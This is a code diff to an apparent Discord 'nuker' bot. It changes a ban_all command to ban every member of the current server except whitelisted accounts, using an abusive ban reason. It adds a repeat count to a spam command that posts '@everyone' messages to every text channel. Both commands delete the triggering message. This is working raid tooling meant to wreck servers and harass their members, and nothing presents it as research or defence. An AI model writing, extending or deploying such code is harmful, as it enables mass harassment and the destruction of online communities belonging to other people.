@@ -32,10 +32,10 @@ class Commands(commands.Cog):
     async def ban_all(self, ctx):
         "Banning all members."
         await ctx.message.delete()
-        for guild in self.bot.guilds:
-            for member in guild.members:
-                if str(member) in settings["whitelist"] or str(member) == settings["bot_user_id"]:
-                    continue
+        for member in ctx.guild.members:
+            if str(member) in settings["whitelist"] or str(member) == settings["bot_user_id"]:
+                continue
+            else:
                 print(f"[green]Banning {member}")
                 try:
                     await member.ban(reason="go fuck yourself")
@@ -68,14 +68,15 @@ class Commands(commands.Cog):
 
     @commands.command(aliases=[ 's', 'spammm'])
     @commands.check(check.in_whitelist)
-    async def spam(self, ctx, *, arg):
-        "Spamming in all channels. Args: message_text"
+    async def spam(self, ctx, count, *, arg):
+        "Spamming in all channels. Args: count, message_text"
         await ctx.message.delete()
-        for channel in ctx.guild.text_channels:
-            try:
-                await channel.send('@everyone ' + arg)
-            except:
-                continue
+        for i in range(int(count)):
+            for channel in ctx.guild.text_channels:
+                try:
+                    await channel.send('@everyone ' + arg)
+                except:
+                    continue
 
 def setup(bot):
     bot.add_cog(Commands(bot))
